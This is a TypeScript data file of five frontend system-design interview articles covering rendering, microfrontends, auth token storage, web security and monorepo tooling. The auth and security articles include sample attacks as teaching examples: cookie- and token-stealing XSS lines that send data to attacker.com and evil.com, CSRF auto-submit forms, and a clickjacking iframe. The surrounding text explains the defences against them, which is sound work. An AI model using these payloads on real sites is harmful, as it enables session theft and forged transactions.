// ─── System Design Blog Posts ─────────────────────────────────────────────────

export interface SystemDesignBlogPost {
  slug: string;
  track: "system-design";
  title: string;
  excerpt: string;
  category: string;
  accentColor: string;
  readTime: string;
  publishedAt: string;
  modifiedAt: string;
  keywords: string[];
  content: string;
}

export const SYSTEM_DESIGN_BLOG_POSTS: SystemDesignBlogPost[] = [

  // ─── 1. Rendering Strategies ─────────────────────────────────────────────

  {
    slug: "rendering-strategies-ssr-csr-ssg-isr",
    track: "system-design",
    title: "Rendering Strategies Explained: SSR vs CSR vs SSG vs ISR (2025)",
    excerpt: "A clear, visual breakdown of all four rendering strategies — when to use each, how they affect SEO and performance, and the exact questions interviewers ask about them.",
    category: "Deep Dive",
    accentColor: "#6366f1",
    readTime: "10 min read",
    publishedAt: "2026-01-15",
    modifiedAt: "2026-06-01",
    keywords: [
      "server side rendering vs client side rendering",
      "SSR vs CSR vs SSG ISR",
      "nextjs rendering strategies",
      "when to use SSR",
      "incremental static regeneration explained",
    ],
    content: `
# Rendering Strategies Explained: SSR vs CSR vs SSG vs ISR

The single most common system design question for senior frontend roles is: **"What rendering strategy would you use for X, and why?"**

Most developers can name the four strategies. Fewer can explain the trade-offs with precision. This guide gives you both.

## Why It Matters for Your Interview

Rendering strategy affects three things interviewers care about:
1. **SEO** — can search engines index the content?
2. **Performance** — what are TTFB and LCP?
3. **Data freshness** — how stale can the content be?

Your answer should address all three for each strategy.

---

## CSR — Client-Side Rendering

The browser downloads a nearly empty HTML file and a JavaScript bundle. React runs in the browser and renders the page.

**What Googlebot sees immediately:**
\`\`\`html
<html>
  <body>
    <div id="root"></div> <!-- empty until JS executes -->
    <script src="/bundle.js"></script>
  </body>
</html>
\`\`\`

**When it's the right choice:**
- Authenticated dashboards (user-specific content, no SEO needed)
- Admin panels and internal tools
- Highly interactive apps where pre-rendering provides no value

**When it fails:**
- Any page that needs Google/Bing indexing
- Pages where users on slow connections see a blank screen for 3+ seconds

**Key trade-off:** Excellent developer experience, poor initial load experience for real users on slow connections.

---

## SSR — Server-Side Rendering

The server runs the React component tree on every request and sends complete HTML to the browser. Users see content immediately. The browser then "hydrates" — attaches React's event handlers to the server-rendered HTML.

\`\`\`javascript
// Next.js Pages Router
export async function getServerSideProps(context) {
  const product = await getProduct(context.params.id);
  return { props: { product } };
}
// Runs on every single request — HTML is fully populated
\`\`\`

**When it's the right choice:**
- Pages with request-time data (user-specific personalization + SEO needed)
- News pages where real-time freshness matters
- Pages that need cookies/headers at render time

**When it's wrong:**
- Mostly-static content — you're paying server costs unnecessarily
- High-traffic pages — every request hits your server

**Key trade-off:** High TTFB because the server must fetch data before responding. Doesn't cache cleanly on CDN.

---

## SSG — Static Site Generation

React runs at **build time**. The output is static HTML files served from a CDN. No server needed at runtime.

\`\`\`javascript
// Runs once at build time — not per request
export async function getStaticProps() {
  const posts = await getAllPosts();
  return { props: { posts } };
}

export async function getStaticPaths() {
  const slugs = await getAllSlugs();
  return {
    paths: slugs.map(slug => ({ params: { slug } })),
    fallback: false,
  };
}
\`\`\`

**When it's the right choice:**
- Marketing pages, landing pages, documentation
- Blog posts, technical articles
- Any content that doesn't change between deployments

**When it's wrong:**
- Content that changes frequently (product prices, stock)
- Millions of pages — build time becomes impractical

**Key trade-off:** Fastest possible delivery from CDN. Content is stale between builds.

---

## ISR — Incremental Static Regeneration

ISR is SSG with a background refresh. Pages are statically generated at build time, but a revalidate interval tells Next.js to regenerate the page in the background after a set time.

\`\`\`javascript
export async function getStaticProps() {
  const product = await getProduct();
  return {
    props: { product },
    revalidate: 3600, // regenerate every hour at most
  };
}
\`\`\`

**The stale-while-revalidate behaviour:**
1. First visitor after build: served static HTML ✅
2. Visitor after 1 hour: still served old HTML (instantly), but a background regen is triggered
3. Next visitor: sees the freshly generated page

**When it's the right choice:**
- E-commerce product pages (inventory/price changes hourly)
- News category pages (new articles, not breaking news)
- Marketing pages with A/B test variants

**Key trade-off:** One visitor after the revalidate window sees stale data while fresh is being built. For most use cases, this is acceptable.

---

## Streaming SSR (React 18 + Next.js App Router)

Instead of waiting for all server data before sending HTML, streaming sends HTML in chunks. Fast parts (navbar, hero) arrive immediately. Slow parts (comments, recommendations) stream in later using Suspense boundaries.

\`\`\`jsx
export default function ProductPage() {
  return (
    <div>
      <ProductHero />           {/* fast — no data needed */}
      <Suspense fallback={<Spinner />}>
        <ProductRecommendations /> {/* slow — waits for API */}
      </Suspense>
      <Suspense fallback={<ReviewSkeleton />}>
        <ProductReviews />        {/* slow — streams separately */}
      </Suspense>
    </div>
  );
}
\`\`\`

**Result:** User sees the hero immediately. Reviews stream in as the server fetches them. TTFB is low; total page load is still full.

---

## The Decision Framework

| Strategy | SEO | TTFB | Data Freshness | Server Cost |
|----------|-----|------|----------------|-------------|
| CSR | ❌ | Fast | Real-time | None |
| SSR | ✅ | Slow | Per-request | High |
| SSG | ✅ | Instant | Build-time | None (CDN) |
| ISR | ✅ | Instant | Periodic | Minimal |
| Streaming | ✅ | Fast | Per-request | Moderate |

**For interviews, answer with three questions:**
1. Does this page need SEO? (No → CSR is fine)
2. How fresh does the data need to be? (Hourly → ISR, per-request → SSR, build-time → SSG)
3. Is the content personalized? (Yes → SSR or CSR)

---

## Common Interview Questions

**Q: "How would you render a product listing page on an e-commerce site?"**
ISR with revalidate: 3600. Products don't change by the second. CDN serves HTML instantly. Background refresh every hour keeps prices and inventory current without server cost per request.

**Q: "What's the difference between SSG and ISR?"**
SSG generates pages once at build time — content is fixed until the next deployment. ISR generates pages at build time but regenerates them in the background after a configurable interval, without requiring a full redeploy.

**Q: "Why is Next.js App Router different?"**
App Router uses React Server Components by default — components can be server-only (no JS shipped to client) and the mental model shifts from "getServerSideProps" to "async component functions that fetch data directly". Streaming is built-in via Suspense.
`,
  },

  // ─── 2. Microfrontends ────────────────────────────────────────────────────

  {
    slug: "microfrontends-vs-monolith",
    track: "system-design",
    title: "Microfrontends vs Monolith: When to Split Your Frontend",
    excerpt: "A practical guide to when microfrontend architecture makes sense, how Module Federation works, and the real trade-offs that interviewers want you to know.",
    category: "Architecture",
    accentColor: "#8b5cf6",
    readTime: "9 min read",
    publishedAt: "2026-02-01",
    modifiedAt: "2026-06-01",
    keywords: [
      "microfrontends vs monolith",
      "webpack module federation",
      "microfrontend architecture when to use",
      "single-spa vs module federation",
      "independent deployment frontend",
    ],
    content: `
# Microfrontends vs Monolith: When to Split Your Frontend

The microfrontend hype cycle has passed. Now we can have an honest conversation about when they're worth the complexity — and when a monolith is simply better.

## What Problem Do Microfrontends Actually Solve?

The answer is almost entirely **organizational**.

Microfrontends solve the **team scaling bottleneck**: when 20 developers all commit to the same frontend repo, merge conflicts are constant, CI takes 30 minutes, and a broken change by Team A blocks Team B's release.

Microfrontends don't primarily solve performance, DX, or code quality problems. If you reach for them for those reasons, you'll be disappointed.

**The right question:** "Do we have multiple teams that need independent deployment cadences?"

- One team, one product → Monolith
- 2-3 teams, shared repo okay → Monolith or modular monolith
- 5+ teams, independent release cadence → Microfrontends worth considering

---

## The Integration Approaches

### 1. Webpack Module Federation (Recommended for React shops)

Module Federation is built into Webpack 5. One app **exposes** components; another **consumes** them — downloaded at runtime from the other app's deployed URL.

\`\`\`javascript
// Cart Team (Remote) — webpack.config.js
new ModuleFederationPlugin({
  name: 'cart',
  filename: 'remoteEntry.js',
  exposes: {
    './CartWidget': './src/CartWidget',
  },
  shared: {
    react: { singleton: true, requiredVersion: '^18.0.0' },
    'react-dom': { singleton: true },
  },
})

// Shell App (Host) — webpack.config.js
new ModuleFederationPlugin({
  name: 'shell',
  remotes: {
    cart: 'cart@https://cart.company.com/remoteEntry.js',
  },
  shared: {
    react: { singleton: true },
    'react-dom': { singleton: true },
  },
})

// Shell usage — CartWidget loads from cart.company.com at runtime
const CartWidget = React.lazy(() => import('cart/CartWidget'));
\`\`\`

**The key: \`singleton: true\`** — this ensures both the shell and the cart remote use the same React instance. Without it, you'll have two copies of React and hooks will break.

### 2. Single-SPA

Framework-agnostic orchestrator. Registers multiple "micro-apps" and mounts/unmounts them based on the URL.

\`\`\`javascript
registerApplication({
  name: '@company/checkout',
  app: () => import('@company/checkout'),
  activeWhen: ['/checkout'],
});
\`\`\`

Single-SPA is the right choice when teams use different frameworks (some React, some Vue, legacy Angular). Module Federation is better for same-framework teams.

### 3. iframes

Strongest isolation. Each microfrontend is completely sandboxed. Zero CSS/JS conflicts.

**The problems:** awful accessibility, fixed heights, no shared routing, terrible mobile experience. Use only for isolated embeds (a payment widget, an embedded analytics dashboard).

---

## Cross-MFE Communication

This is where most teams get it wrong.

**Wrong:** Import from another MFE's package directly.
\`\`\`javascript
// This creates tight coupling — defeats the purpose
import { useCart } from '@company/cart';
\`\`\`

**Right:** Custom events or a shared event bus.
\`\`\`javascript
// Cart MFE fires an event
window.dispatchEvent(new CustomEvent('cart:item-added', {
  detail: { productId: '123', quantity: 1 }
}));

// Header MFE listens
window.addEventListener('cart:item-added', (e) => {
  setCartCount(prev => prev + e.detail.quantity);
});
\`\`\`

The shell (container app) owns global state — user session, auth tokens, feature flags. Micro-apps receive what they need as props at mount time and fire events to communicate back up.

---

## The Real Trade-offs

### What you gain:
- Independent deployment (deploy cart without touching checkout)
- Team autonomy (Cart Team owns their stack)
- Isolated failures (cart deploy broken? Checkout still works)

### What you pay:
- **Bundle duplication:** even with \`shared\` config, you'll ship more bytes than a monolith
- **Design inconsistency:** each team naturally drifts from the design system
- **Debugging complexity:** errors cross team boundaries; distributed tracing required
- **Operational overhead:** 5 separate CI pipelines, 5 Webpack configs, 5 deployment targets
- **Version compatibility:** "Cart requires React 18.2, but shell is on 18.0" — real problem in practice

---

## When the Monolith Wins

A well-structured modular monolith with clear module boundaries is easier to build, test, and debug than a microfrontend architecture for most team sizes.

Nx and Turborepo let you have **monorepo benefits** (shared code, unified CI) with **module boundaries** (enforced import rules between packages) without the runtime complexity of Module Federation.

**Consider this path first:**
1. Monorepo with pnpm workspaces
2. Nx with enforced module boundaries
3. Feature-based folder structure (each feature is an isolated directory)
4. Shared packages for UI components, hooks, utilities

Only add the runtime MFE layer (Module Federation) when independent deployment is a genuine business requirement.

---

## Interview Answer Template

"I'd use microfrontends when we have 5+ teams with genuinely different release cadences and different areas of ownership. For the technical approach I'd use Webpack Module Federation because it allows runtime composition while sharing React instances. The key challenges I'd plan for are: shared state via events not direct imports, a unified design system owned by a platform team, and coordinated versioning of shared dependencies. For smaller organisations I'd first try a modular monolith in a Nx monorepo with enforced module boundaries — you get team boundaries without the operational complexity."
`,
  },

  // ─── 3. JWT vs Cookies ────────────────────────────────────────────────────

  {
    slug: "jwt-vs-cookie-authentication",
    track: "system-design",
    title: "JWT vs Cookie Authentication: What Senior Interviewers Want to Know",
    excerpt: "The definitive comparison of JWT and cookie-based auth — token storage, refresh token rotation, httpOnly cookies, CSRF, and the real reasons to choose one over the other.",
    category: "Security",
    accentColor: "#ef4444",
    readTime: "10 min read",
    publishedAt: "2026-02-15",
    modifiedAt: "2026-06-01",
    keywords: [
      "JWT vs cookie authentication",
      "refresh token rotation",
      "where to store JWT",
      "httpOnly cookie JWT",
      "CSRF vs XSS token storage",
      "OAuth PKCE frontend",
    ],
    content: `
# JWT vs Cookie Authentication: What Senior Interviewers Want to Know

"Where should you store authentication tokens?" is one of the most frequently asked senior frontend questions. Most candidates get half of it right. This guide covers all of it.

## The Core Mental Model

Authentication is a **trust** problem: "How does the server verify that request #1,000,000 comes from the same user who authenticated in request #1?"

Two approaches:
1. **Session-based:** server remembers the user; browser carries only an ID
2. **Token-based (JWT):** server forgets the user; browser carries a self-verifying token

Neither is universally better. The right choice depends on your architecture.

---

## Session-Based Authentication

\`\`\`
Login:  POST /login → server creates session → Set-Cookie: sid=abc123; HttpOnly
Request: GET /profile → Cookie: sid=abc123 → server looks up session in Redis
Logout: DELETE session from Redis → cookie becomes invalid immediately
\`\`\`

**Pros:**
- Instant revocation — delete the session, the user is logged out immediately
- Small cookie (just an ID), no sensitive data in the browser
- Server has full visibility over active sessions

**Cons:**
- Requires a shared session store (Redis) for horizontal scaling
- Every request hits the session store for lookup

---

## JWT — JSON Web Tokens

\`\`\`
// JWT structure: header.payload.signature (base64url encoded, NOT encrypted)
{
  "sub": "user_123",
  "email": "alice@example.com",
  "role": "admin",
  "iat": 1700000000,
  "exp": 1700003600   // expires in 1 hour
}
// Signed with server's secret key — tampering invalidates signature
\`\`\`

The server validates the signature without any database lookup. This is the "stateless" advantage.

**Pros:**
- No session store needed — works across microservices
- Horizontal scaling trivially (any server validates any token)
- Can encode claims (roles, permissions) — no extra DB query

**Cons:**
- Cannot revoke before expiry — a stolen JWT is valid until exp
- Token grows with each added claim
- Secret key rotation is tricky at scale

---

## The Most Important Question: Where Do You Store the Token?

This is the question interviewers ask to separate senior from junior candidates.

### localStorage / sessionStorage

\`\`\`javascript
// Common but problematic
localStorage.setItem('token', jwt);

// Any script on the page can read it — including injected XSS
fetch('https://attacker.com/steal', {
  body: localStorage.getItem('token') // token gone
});
\`\`\`

**Problem:** XSS vulnerability. Any JavaScript on your page — including third-party scripts, browser extensions, or injected code — can read localStorage.

### httpOnly Cookie (Correct Answer)

\`\`\`
# Server sets the token as httpOnly cookie
Set-Cookie: access_token=<jwt>; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=900

# JavaScript cannot access it
document.cookie        // won't show access_token
localStorage           // not here either

# Browser sends it automatically with every request to the domain
GET /api/profile
Cookie: access_token=<jwt>   // browser adds this, code doesn't
\`\`\`

**Why this is correct:** \`HttpOnly\` prevents JavaScript from reading the cookie. XSS attacks cannot steal what JavaScript cannot access. The token is invisible to all client-side code.

**The trade-off:** Now you must mitigate CSRF (since cookies are sent automatically). Solution: \`SameSite=Strict\` or \`SameSite=Lax\` prevents cross-site requests from carrying the cookie.

---

## Refresh Token Rotation

Access tokens should be short-lived (15 minutes). How do you avoid logging users out every 15 minutes?

\`\`\`
Login response:
  Set-Cookie: access_token=<at>; HttpOnly; Max-Age=900   (15 min)
  Set-Cookie: refresh_token=<rt>; HttpOnly; Path=/auth/refresh; Max-Age=604800 (7 days)

When access token expires (401 received):
  POST /auth/refresh
  Cookie: refresh_token=<rt>

Refresh response:
  Set-Cookie: access_token=<new_at>; HttpOnly; Max-Age=900    // new access token
  Set-Cookie: refresh_token=<new_rt>; HttpOnly; Max-Age=604800 // new refresh token (ROTATION)
  // Old refresh token is now invalid
\`\`\`

**Why rotation matters:** Each refresh token is single-use. If an attacker steals the refresh token and uses it, the legitimate user's next refresh attempt fails (the token was already rotated). The system detects the reuse, revokes the entire token family, and forces re-login.

---

## OAuth 2.0 with PKCE (For "Sign in with Google/GitHub")

SPAs cannot safely hold a client secret. The Authorization Code + PKCE flow solves this:

\`\`\`javascript
// 1. Generate code verifier and challenge
const verifier = crypto.randomUUID() + crypto.randomUUID(); // random 64-char string
const challenge = btoa(await crypto.subtle.digest('SHA-256', encoder.encode(verifier)));

// 2. Redirect to OAuth provider
window.location.href = \`https://provider.com/authorize?
  client_id=your_app&
  redirect_uri=https://yourapp.com/callback&
  response_type=code&
  code_challenge=\${challenge}&
  code_challenge_method=S256\`;

// 3. Exchange code for tokens (with the verifier that proves your identity)
const tokens = await fetch('https://provider.com/token', {
  method: 'POST',
  body: new URLSearchParams({
    code: callbackCode,
    code_verifier: verifier, // proves you started this flow
    client_id: 'your_app',
    grant_type: 'authorization_code',
  }),
});
\`\`\`

**Why PKCE:** The code_verifier proves the entity exchanging the authorization code is the same one that started the flow. An attacker who intercepts the code from the URL cannot exchange it without the verifier.

---

## The Complete Security Checklist

| Threat | Defense |
|--------|---------|
| XSS stealing tokens | httpOnly cookies |
| CSRF forging requests | SameSite=Strict/Lax |
| Token reuse after logout | Refresh token rotation |
| Stolen refresh token | Rotation + family revocation |
| Long-lived access | Short expiry (15m) access tokens |
| Man-in-the-middle | Secure flag on cookies (HTTPS only) |

---

## Interview Answer Template

"I'd store the access token in an httpOnly cookie — JavaScript can't read it, so XSS attacks can't steal it. Access tokens should be short-lived (15 minutes) with a separate long-lived refresh token, also httpOnly, scoped to the refresh endpoint only. On expiry, the client hits /auth/refresh to get a new pair. Refresh tokens should rotate on each use — this detects replay attacks. For CSRF protection with cookies, I'd set SameSite=Lax or Strict, which blocks cross-site cookie sending for most attack vectors. localStorage is convenient but off the table for tokens in security-conscious applications."
`,
  },

  // ─── 4. Frontend Security ────────────────────────────────────────────────

  {
    slug: "frontend-security-xss-csrf-csp",
    track: "system-design",
    title: "Frontend Security: XSS, CSRF, CSP, and Clickjacking Explained",
    excerpt: "A complete guide to the four frontend security threats that appear in senior interviews — with attack vectors, concrete code examples, and the exact defenses that work.",
    category: "Security",
    accentColor: "#dc2626",
    readTime: "11 min read",
    publishedAt: "2026-03-01",
    modifiedAt: "2026-06-01",
    keywords: [
      "XSS cross site scripting prevention",
      "CSRF attack defense",
      "content security policy tutorial",
      "clickjacking prevention",
      "frontend security interview questions",
      "OWASP top 10 frontend",
    ],
    content: `
# Frontend Security: XSS, CSRF, CSP, and Clickjacking Explained

Frontend security appears more often in senior interviews than most developers expect. Not because interviewers are trying to catch you out — but because security vulnerabilities in frontend code have real consequences. This guide covers the four most important attacks and their defenses.

## 1. XSS — Cross-Site Scripting

### What It Is

XSS occurs when an attacker injects malicious JavaScript into your page that executes in other users' browsers. Because it runs in your origin, it has full access to cookies, localStorage, DOM, and the ability to make authenticated requests on the victim's behalf.

### The Three Types

**Stored XSS** — malicious script saved to a database, rendered to all users who load that content.
\`\`\`html
<!-- Attacker posts a comment with: -->
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>
<!-- Every user who sees this comment gets their cookie stolen -->
\`\`\`

**Reflected XSS** — script in a URL parameter reflected back in the response.
\`\`\`
https://example.com/search?q=<script>stealCookies()</script>
\`\`\`

**DOM-based XSS** — client-side code writes attacker-controlled data to the DOM.
\`\`\`javascript
// Vulnerable
const name = new URLSearchParams(location.search).get('name');
document.getElementById('greeting').innerHTML = 'Hello, ' + name;
// URL: /page?name=<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">
\`\`\`

### Prevention

\`\`\`javascript
// ✅ Safe — textContent doesn't parse HTML
document.getElementById('greeting').textContent = 'Hello, ' + name;

// ✅ React JSX is safe by default — it escapes all values
function Greeting({ name }) {
  return <div>Hello, {name}</div>;  // name is escaped
}

// ❌ React's escape hatch — only use with sanitized HTML
<div dangerouslySetInnerHTML={{ __html: sanitize(userHtml) }} />

// ✅ Sanitize rich HTML with DOMPurify
import DOMPurify from 'dompurify';
const safe = DOMPurify.sanitize(untrustedHtml);
element.innerHTML = safe;
\`\`\`

**Secondary defense:** httpOnly cookies. If scripts can't read cookies, stolen sessions are harder even if XSS succeeds.

---

## 2. CSRF — Cross-Site Request Forgery

### What It Is

An attacker's page tricks your browser into sending an authenticated request to your server. The browser automatically sends cookies with every same-domain request — even requests initiated from a different domain.

\`\`\`html
<!-- Attacker's page — victim is logged into bank.com -->
<img src="https://bank.com/transfer?to=attacker&amount=10000" />
<!-- Browser sends GET with all bank.com cookies — authenticated -->

<form action="https://bank.com/transfer" method="POST" id="form">
  <input name="to" value="attacker" />
  <input name="amount" value="10000" />
</form>
<script>document.getElementById('form').submit();</script>
<!-- Auto-submits POST with cookies — the server can't tell it's forged -->
\`\`\`

### Prevention

**SameSite Cookie Attribute (Primary Defense)**
\`\`\`
Set-Cookie: session=abc123; SameSite=Strict; HttpOnly; Secure
# Strict — cookie not sent on ANY cross-site request (including links)
# Lax (default) — cookie sent on top-level GET navigations, not on POST/sub-resource
# None — sent on all cross-site requests (requires Secure)
\`\`\`

**CSRF Tokens (Defense in Depth)**
\`\`\`javascript
// Server generates a random token per session
const csrfToken = crypto.randomBytes(32).toString('hex');
session.csrfToken = csrfToken;

// Client includes it in every state-changing request
headers: { 'X-CSRF-Token': csrfToken }
// Attacker can't forge this header — same-origin policy prevents reading it
\`\`\`

**Use Authorization Headers for APIs**
\`\`\`javascript
// Custom headers can't be set in CSRF attacks
fetch('/api/transfer', {
  headers: { 'Authorization': 'Bearer ' + token }
});
// Forms and img tags can't set custom headers
\`\`\`

---

## 3. CSP — Content Security Policy

### What It Is

CSP is an HTTP response header that whitelists which sources can load scripts, styles, images, and make connections. Even if an attacker injects a script tag, CSP prevents it from executing.

### A Practical CSP

\`\`\`
Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://cdn.trusted.com;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  connect-src 'self' https://api.yourapp.com;
  font-src 'self' https://fonts.gstatic.com;
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
\`\`\`

### Nonces — The Gold Standard

Instead of whitelisting entire origins for scripts, use cryptographic nonces:

\`\`\`javascript
// Server generates a unique nonce per request
const nonce = crypto.randomBytes(16).toString('base64');
res.setHeader('Content-Security-Policy', \`script-src 'nonce-\${nonce}'\`);

// Only scripts with this nonce execute
\`\`\`
\`\`\`html
<script nonce="rAnd0mNonce123">
  // This executes — has the nonce
</script>
<script>
  // This is blocked — no nonce
  stealData();
</script>
\`\`\`

**Avoid \`unsafe-inline\` and \`unsafe-eval\`** — they defeat most of CSP's protections.

### Starting with Report-Only Mode

\`\`\`
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report
\`\`\`

Violations are reported but not blocked. Use this to audit your existing app before enforcing.

---

## 4. Clickjacking

### What It Is

An attacker embeds your site in a transparent iframe on their page. Users think they're clicking on the attacker's content but are actually clicking on hidden buttons on your site.

\`\`\`html
<!-- Attacker's page -->
<style>
  iframe { opacity: 0; position: absolute; top: 0; left: 0; width: 100%; height: 100%; }
</style>
<iframe src="https://yourbank.com/transfer?to=attacker"></iframe>
<button>Click to win $1000!</button>
<!-- User clicks "win $1000" but actually clicks "confirm transfer" on your bank -->
\`\`\`

### Prevention

\`\`\`
# HTTP header — prevents any framing
X-Frame-Options: DENY

# Or via CSP (preferred — more flexible)
Content-Security-Policy: frame-ancestors 'none'

# Allow framing only by specific origin
Content-Security-Policy: frame-ancestors 'self' https://trusted.com
\`\`\`

---

## The Complete Security Headers Checklist

\`\`\`
Content-Security-Policy: default-src 'self'; frame-ancestors 'none'
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=(), geolocation=()
\`\`\`

**What each does:**
- **HSTS:** forces HTTPS for all future visits — even if user types http://
- **X-Content-Type-Options: nosniff** — prevents browser from guessing MIME type and executing uploaded files as scripts
- **Referrer-Policy** — controls how much of the current URL is sent in the Referer header

---

## Interview Summary

The four attacks and their primary defenses:

| Attack | Primary Defense | Secondary Defense |
|--------|----------------|-------------------|
| XSS | textContent not innerHTML; React JSX auto-escape | CSP; httpOnly cookies |
| CSRF | SameSite=Lax/Strict | CSRF tokens; Authorization headers |
| Clickjacking | frame-ancestors 'none' | X-Frame-Options: DENY |
| Token theft | httpOnly cookies | Short token expiry |

Always mention the \`httpOnly\` cookie as the connection between XSS and token storage — it shows you understand how the attacks interact.
`,
  },

  // ─── 5. Monorepo: Turborepo vs Nx ────────────────────────────────────────

  {
    slug: "monorepo-turborepo-vs-nx",
    track: "system-design",
    title: "Monorepo with Turborepo vs Nx: The Complete Comparison (2025)",
    excerpt: "A practical comparison of Turborepo and Nx — when to use each, how remote caching works, and how to design a monorepo architecture for large frontend teams.",
    category: "Build Systems",
    accentColor: "#06b6d4",
    readTime: "9 min read",
    publishedAt: "2026-03-15",
    modifiedAt: "2026-06-01",
    keywords: [
      "turborepo vs nx 2025",
      "monorepo architecture frontend",
      "turborepo remote caching",
      "nx affected command",
      "pnpm workspaces monorepo",
      "monorepo interview questions",
    ],
    content: `
# Monorepo with Turborepo vs Nx: The Complete Comparison (2025)

Monorepos solve a real problem in large codebases: shared code between multiple apps. When 5 teams all depend on a common UI library, a monorepo makes atomic changes, unified CI, and consistent tooling possible.

But choosing between Turborepo and Nx confuses many teams. Here's a clear comparison.

## What Problem Does a Monorepo Build Tool Solve?

Without a smart build system, a monorepo with 30 packages runs every task (build, test, lint) on every package on every commit. With 30 packages and 5-minute average build times, CI takes 150 minutes.

**Turborepo and Nx solve this with two techniques:**
1. **Content-addressed caching** — if inputs (source files, dependencies) haven't changed, restore the output from cache instead of rebuilding
2. **Task graph execution** — understand which packages depend on which, run them in parallel as much as possible

---

## Workspace Setup (Foundation)

Both tools sit on top of standard package manager workspaces. Start with pnpm (recommended for its efficiency):

\`\`\`
monorepo/
  apps/
    web/          package.json
    mobile/       package.json
  packages/
    ui/           package.json
    utils/        package.json
    config/       package.json
  package.json    (root — declares workspaces)
  pnpm-workspace.yaml
\`\`\`

\`\`\`yaml
# pnpm-workspace.yaml
packages:
  - 'apps/*'
  - 'packages/*'
\`\`\`

\`\`\`json
// packages/ui/package.json
{
  "name": "@company/ui",
  "main": "./src/index.ts"
}

// apps/web/package.json
{
  "dependencies": {
    "@company/ui": "workspace:*"   // uses local package, no npm publish needed
  }
}
\`\`\`

---

## Turborepo

Turborepo wraps your existing package.json scripts. Minimal config, low learning curve.

### Pipeline Configuration

\`\`\`json
// turbo.json
{
  "$schema": "https://turbo.build/schema.json",
  "pipeline": {
    "build": {
      "dependsOn": ["^build"],   // build all dependencies first (^)
      "outputs": ["dist/**", ".next/**"]
    },
    "test": {
      "dependsOn": ["build"],
      "outputs": ["coverage/**"],
      "cache": true
    },
    "lint": {
      "outputs": [],
      "cache": true
    },
    "dev": {
      "cache": false,     // don't cache dev servers
      "persistent": true
    }
  }
}
\`\`\`

### Running Tasks

\`\`\`bash
# Build all packages (in dependency order, parallel where possible)
turbo run build

# Only run build + test for changed packages
turbo run build test --filter=...[origin/main]

# Build a specific package and its dependencies
turbo run build --filter=@company/web...
\`\`\`

### Remote Caching

The killer feature. Store build artifacts in the cloud — CI skips tasks it has already done.

\`\`\`bash
# Vercel Remote Cache (free for Vercel deployments)
npx turbo login
npx turbo link

# Now CI restores from remote cache on cache hits
# A "build" that took 10 minutes takes 30 seconds on cache hit
\`\`\`

---

## Nx

Nx is more opinionated and feature-rich. It replaces scripts with "executors" and adds generators (scaffolding), a visual dependency graph, and deep framework integrations.

### Workspace Configuration

\`\`\`json
// nx.json
{
  "targetDefaults": {
    "build": {
      "dependsOn": ["^build"],
      "cache": true
    },
    "test": {
      "cache": true
    }
  }
}
\`\`\`

### The Affected Command — Nx's Killer Feature

\`\`\`bash
# Only build/test packages changed since main
npx nx affected --target=build --base=main
npx nx affected --target=test --base=main

# Visualize the dependency graph
npx nx graph

# Generate a new library
npx nx g @nx/react:library ui --directory=packages/ui
\`\`\`

Nx's \`affected\` is smarter than Turborepo's filter — it uses your actual import graph to determine which packages are affected by a change. Change a utility function, and Nx knows exactly which packages import it.

### Module Boundary Enforcement

\`\`\`json
// .eslintrc.json — enforce import rules between packages
{
  "rules": {
    "@nx/enforce-module-boundaries": [
      "error",
      {
        "depConstraints": [
          {
            "sourceTag": "scope:app",
            "onlyDependOnLibsWithTags": ["scope:lib", "scope:util"]
          },
          {
            "sourceTag": "scope:lib",
            "onlyDependOnLibsWithTags": ["scope:util"]
          }
        ]
      }
    ]
  }
}
\`\`\`

**This is Nx's strongest unique feature** — it enforces architectural boundaries at the linting level. Apps can't import from other apps. UI libs can't import from feature libs. Violations fail CI.

---

## Direct Comparison

| | Turborepo | Nx |
|---|---|---|
| **Config** | Minimal — wraps existing scripts | More opinionated — replaces scripts |
| **Learning curve** | Low | Moderate-High |
| **Affected analysis** | File-hash based | Import-graph based (more precise) |
| **Generators** | None built-in | Full generator/executor system |
| **Module boundaries** | Manual | Enforced via ESLint rule |
| **Framework support** | Agnostic | Deep Next.js, Angular, Nest.js integration |
| **Remote cache** | Vercel (built-in) or self-hosted | Nx Cloud or self-hosted |
| **Graph visualization** | Basic | Full interactive graph |
| **Best for** | JS/TS teams already using workspaces | Larger teams needing scaffolding + strict boundaries |

---

## Which Should You Choose?

**Choose Turborepo if:**
- You already have package.json scripts you want to keep
- Your team wants minimal new concepts
- You're on Vercel and want free remote caching

**Choose Nx if:**
- You want enforced module boundaries (prevents accidental coupling)
- You need code generators for consistent scaffolding across teams
- You're using Angular or deep Next.js integration

**For a new project starting today:** Turborepo with pnpm workspaces is faster to adopt and covers 90% of monorepo needs. Add Nx if you later need generators or strict boundary enforcement.

---

## Interview Answer

"For a large team sharing a component library, auth logic, and utilities across multiple apps, I'd set up a pnpm workspace monorepo. For the build system, I'd use Turborepo for most teams — it wraps existing scripts, has minimal config, and remote caching means CI goes from 10 minutes to 30 seconds on cache hits. If the team needs strict module boundaries enforced at the linting level (preventing feature A from importing feature B), I'd add Nx for its enforce-module-boundaries ESLint rule. The workspace:* protocol means shared packages don't need to be published to npm — changes are immediately available to all consuming apps."
`,
  },
];
